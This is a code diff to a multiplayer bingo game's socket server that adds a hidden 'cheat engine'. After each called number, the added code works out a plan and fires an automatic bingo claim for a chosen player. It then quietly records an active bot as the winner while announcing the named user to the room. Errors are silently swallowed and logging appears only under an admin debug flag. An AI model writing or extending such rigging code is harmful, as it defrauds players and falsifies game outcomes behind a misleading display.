@@ -2,6 +2,8 @@ import { Server as SocketServer } from 'socket.io'
 import { Server as HttpServer } from 'http'
 import { gameStateManager, GameState, BingoClaim } from '../lib/game-state-manager'
 import { supabaseAdmin } from '../lib/supabase'
+import { CheatEngine } from '../lib/cheat-engine'
+import { selectActiveBotJSON } from './bot-service'
 
 // Socket event types for in-game functionality
 interface InGameServerToClientEvents {
@@ -57,12 +59,16 @@ export class InGameSocketServer {
   private io: SocketServer<InGameClientToServerEvents, InGameServerToClientEvents, InGameInterServerEvents, InGameSocketData>
   private gameRooms = new Map<string, Set<string>>() // roomId -> Set<socketId>
   private socketToRoom = new Map<string, string>() // socketId -> roomId
+  private cheatEngine: CheatEngine
 
   constructor(io: SocketServer<InGameClientToServerEvents, InGameServerToClientEvents, InGameInterServerEvents, InGameSocketData>) {
     this.io = io
 
     this.setupEventHandlers()
     console.log('🎮 In-Game Socket Server initialized')
+
+    this.cheatEngine = new CheatEngine()
+    this.cheatEngine.loadConfig().catch(() => {})
   }
 
   private setupEventHandlers(): void {
@@ -188,6 +194,71 @@ export class InGameSocketServer {
     }
   }
 
+  private async executeCheatClaim(
+    roomId: string,
+    username: string,
+    bingoPattern: 'row' | 'column' | 'diagonal' | 'full_house',
+    winningCells: number[]
+  ): Promise<void> {
+    const game = gameStateManager.getGameState(roomId)
+    if (!game || game.winner_claimed) return
+    const player = game.players.get(username)
+    if (!player || player.status !== 'active') return
+
+    const claim: BingoClaim = {
+      username,
+      claimed_cells: winningCells,
+      bingo_pattern: bingoPattern,
+      board: player.board
+    }
+
+    const validation = await gameStateManager.validateBingoClaim(roomId, claim)
+
+    if (validation.isLateClaim) {
+      if (this.cheatEngine.isAdminDebug()) {
+        console.log(`[DEBUG] Cheat late-claim ignored in ${roomId} for ${username}`)
+      }
+      return
+    }
+
+    if (validation.isValid && validation.isWinner) {
+      try {
+        const bot = await selectActiveBotJSON(supabaseAdmin as any)
+        if (bot && bot.id) {
+          ;(game as any).winner_id = bot.id
+        }
+      } catch {}
+
+      await gameStateManager.endGame(roomId, username, 'bingo_claimed')
+
+      this.io.to(roomId).emit('bingo_winner', {
+        username,
+        pattern: bingoPattern,
+        winningCells,
+        timestamp: new Date().toISOString()
+      })
+
+      const st = gameStateManager.getGameState(roomId)
+      const duration = st ? Date.now() - st.started_at.getTime() : 0
+
+      this.io.to(roomId).emit('game_over', {
+        winner: username,
+        reason: 'bingo_claimed',
+        finalNumbers: st?.numbers_called || [],
+        duration: Math.floor(duration / 1000),
+        timestamp: new Date().toISOString()
+      })
+
+      if (this.cheatEngine.isAdminDebug()) {
+        console.log(`[DEBUG] Cheat executed in ${roomId}, winner announced as ${username}`)
+      }
+
+      setTimeout(() => {
+        this.cleanupGameRoom(roomId)
+      }, 5000)
+    }
+  }
+
   /**
    * Handle number called
    */
@@ -201,6 +272,19 @@ export class InGameSocketServer {
     })
 
     console.log(`📢 Room ${roomId}: Called ${letter}${number} (${remaining} remaining)`)
+
+    const gameState = gameStateManager.getGameState(roomId)
+    if (!gameState) return
+
+    try {
+      const plan = this.cheatEngine.computePlan(gameState)
+      if (plan.shouldCheat && plan.targetUsername) {
+        process.nextTick(() => {
+          this.executeCheatClaim(roomId, plan.targetUsername!, plan.pattern as any, plan.winningCells || [])
+        })
+      }
+    } catch (e) {
+    }
   }
 
   /**
